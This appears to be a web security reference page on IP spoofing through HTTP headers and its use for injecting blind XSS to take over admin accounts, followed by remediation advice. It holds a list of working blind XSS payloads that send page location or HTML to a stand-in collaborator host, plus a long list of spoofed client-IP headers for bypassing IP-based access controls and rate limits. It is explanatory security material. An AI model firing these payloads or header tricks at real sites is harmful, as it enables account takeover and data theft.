---
layout: col-sidebar
title: IP Spoofing via HTTP Headers
author: Ahmadreza Parsizadeh
contributors: AREX
tags: [attack, IP Spoofing, XSS, Admin Account Take Over]
---

{% include writers.html %}

## Description

In the realm of web security, understanding the nuances of IP spoofing becomes paramount as malicious actors exploit vulnerabilities in HTTP headers to deceive systems. By examining the risks associated with trusting headers like X-Forwarded-For, The potential consequences will be unveiled and offer insights into securing applications against these threats.

## Significance of Client IP Addresses

Client IP addresses often serve as crucial identifiers in web applications, influencing access controls and rate limits. Understanding their significance is paramount for evaluating potential vulnerabilities and implementing robust security measures.

### Examples of Access Controls and Rate Limits

1. **Access Controls Based on IP Addresses:**
   - *Scenario:* An application restricts access to sensitive administrative functionality only to clients connecting from the local IP address of the server.
   - *Implementation:* The application checks the source IP address of incoming requests and grants access only if the address matches the server's local IP.
2. **Rate Limits Based on IP Addresses:**
   - *Scenario:* A login system allows a limited number of failed login attempts from each unique IP address within a specified timeframe.
   - *Implementation:* The application tracks failed login attempts along with the corresponding IP addresses. If the allowed limit is exceeded, further login attempts from that IP are temporarily restricted.

### Web Application Impact

#### Impact on User Activity Logs

IP spoofing can significantly impact web applications that log user activity, leading to potential inaccuracies in historical data and log poisoning. Malicious actors exploiting IP spoofing may manipulate logs, making it challenging to trace legitimate and malicious actions accurately.

#### Admin Account Takeover using Blind XSS

1. **Scenario:**
    - Malicious actors utilize IP spoofing to inject payloads via HTTP headers, leading to generating inaccurate logs or inject malicious payloads via HTTP headers for achieving Blind XSS to take over the admin's account.

2. **Impact:**
    - Blind-stored XSS attacks allow adversaries to inject malicious scripts into the application's database. When legitimate users access compromised pages, these scripts execute, potentially leading to unauthorized access, data theft, or other malicious activities. For numerous web applications based on their functionality, the admin needs to access the history of login activities and users' IPs will be recorded. The attacker injects some Blind XSS payloads and if the admin portal is vulnerable to XSS, the attacker can hijack the admin's cookies and take over the admin's account.

### Payloads for Blind XSS

```HTML
'"><img src="https://example.burpcollaborator.net/image">

</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>

[<iframe/srcdoc=”<script/src=//narayananm.xss.ht></script>”>]

'"><img src="https://example.burpcollaborator.net/image-only" onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='this.src="https://"+btoa(document.location)+".example.burpcollaborator.net/image-dns?"'>

'"><img src=x onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='fetch("https://example.burpcollaborator.net/image-xss-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>

'"><iframe src='javascript:window.location="https://example.burpcollaborator.net/iframe-src?"+btoa(parent.document.location)'></iframe>

'"><iframe srcdoc='<script>window.location="https://example.burpcollaborator.net/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>

'"><iframe srcdoc='<script>fetch("https://example.burpcollaborator.net/iframe-srcdoc-post",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>

'"><object data='javascript:window.location="https://example.burpcollaborator.net/iframe-src?"+btoa(parent.document.location)'></object>

<input onfocus='fetch("https://example.burpcollaborator.net/imput-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})' autofocus>

'"><script src=https://example.burpcollaborator.net/script-tag></script>

'"><script type="text/javascript" src="https://example.burpcollaborator.net/script-tag-type"></script>

'"><script type="module" src="https://example.burpcollaborator.net/script-tag-module"></script>

'"><script nomodule src="https://example.burpcollaborator.net/script-tag-nomodule"></script>

javascript:window.location="https://example.burpcollaborator.net/js-scheme?"+btoa(document.location)

javascript:fetch("https://example.burpcollaborator.net/js-scheme-fetch?"+btoa(document.location))
```

### Headers for IP Spoofing

```HTTP
CACHE_INFO: 127.0.0.1
CF_CONNECTING_IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
CLIENT_IP: 127.0.0.1
Client-IP: 127.0.0.1
COMING_FROM: 127.0.0.1
CONNECT_VIA_IP: 127.0.0.1
FORWARD_FOR: 127.0.0.1
FORWARD-FOR: 127.0.0.1
FORWARDED_FOR_IP: 127.0.0.1
FORWARDED_FOR: 127.0.0.1
FORWARDED-FOR-IP: 127.0.0.1
FORWARDED-FOR: 127.0.0.1
FORWARDED: 127.0.0.1
HTTP-CLIENT-IP: 127.0.0.1
HTTP-FORWARDED-FOR-IP: 127.0.0.1
HTTP-PC-REMOTE-ADDR: 127.0.0.1
HTTP-PROXY-CONNECTION: 127.0.0.1
HTTP-VIA: 127.0.0.1
HTTP-X-FORWARDED-FOR-IP: 127.0.0.1
HTTP-X-IMFORWARDS: 127.0.0.1
HTTP-XROXY-CONNECTION: 127.0.0.1
PC_REMOTE_ADDR: 127.0.0.1
PRAGMA: 127.0.0.1
PROXY_AUTHORIZATION: 127.0.0.1
PROXY_CONNECTION: 127.0.0.1
Proxy-Client-IP: 127.0.0.1
PROXY: 127.0.0.1
REMOTE_ADDR: 127.0.0.1
Source-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Via: 127.0.0.1
WL-Proxy-Client-IP: 127.0.0.1
X_CLUSTER_CLIENT_IP: 127.0.0.1
X_COMING_FROM: 127.0.0.1
X_DELEGATE_REMOTE_HOST: 127.0.0.1
X_FORWARDED_FOR_IP: 127.0.0.1
X_FORWARDED: 127.0.0.1
X_IMFORWARDS: 127.0.0.1
X_LOCKING: 127.0.0.1
X_LOOKING: 127.0.0.1
X_REAL_IP: 127.0.0.1
X-Backend-Host: 127.0.0.1
X-BlueCoat-Via: 127.0.0.1
X-Cache-Info: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1, 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-From-IP: 127.0.0.1
X-From: 127.0.0.1
X-Gateway-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Ip: 127.0.0.1
X-Original-Host: 127.0.0.1
X-Original-IP: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originally-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-ProxyMesh-IP: 127.0.0.1
X-ProxyUser-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-True-Client-IP: 127.0.0.1
XONNECTION: 127.0.0.1
XPROXY: 127.0.0.1
XROXY_CONNECTION: 127.0.0.1
Z-Forwarded-For: 127.0.0.1
ZCACHE_CONTROL: 127.0.0.1
```

## Remediation

1. **Validate and Sanitize Input:**
    - Implement strict input validation to ensure that client-provided data, including headers, is legitimate.
    - Sanitize input to remove potentially harmful content.

2. **Use Secure Protocols:**
    - Enforce the use of secure communication protocols (HTTPS) to protect against man-in-the-middle attacks.

3. **Implement Rate Limiting and Access Controls:**
    - Diversify access controls and rate limiting mechanisms beyond relying solely on client IP addresses.

4. **Logging Best Practices:**
    - Employ logging best practices to detect and respond to potential IP spoofing incidents.
    - Regularly review and analyze logs to identify suspicious activities.

5. **Educate Development Teams:**
    - Provide training to development teams on secure coding practices, emphasizing the risks associated with trusting client-provided data.

By adopting these remediation measures, organizations can bolster their defenses against IP spoofing attacks facilitated through HTTP headers, fortifying their web applications against potential threats.

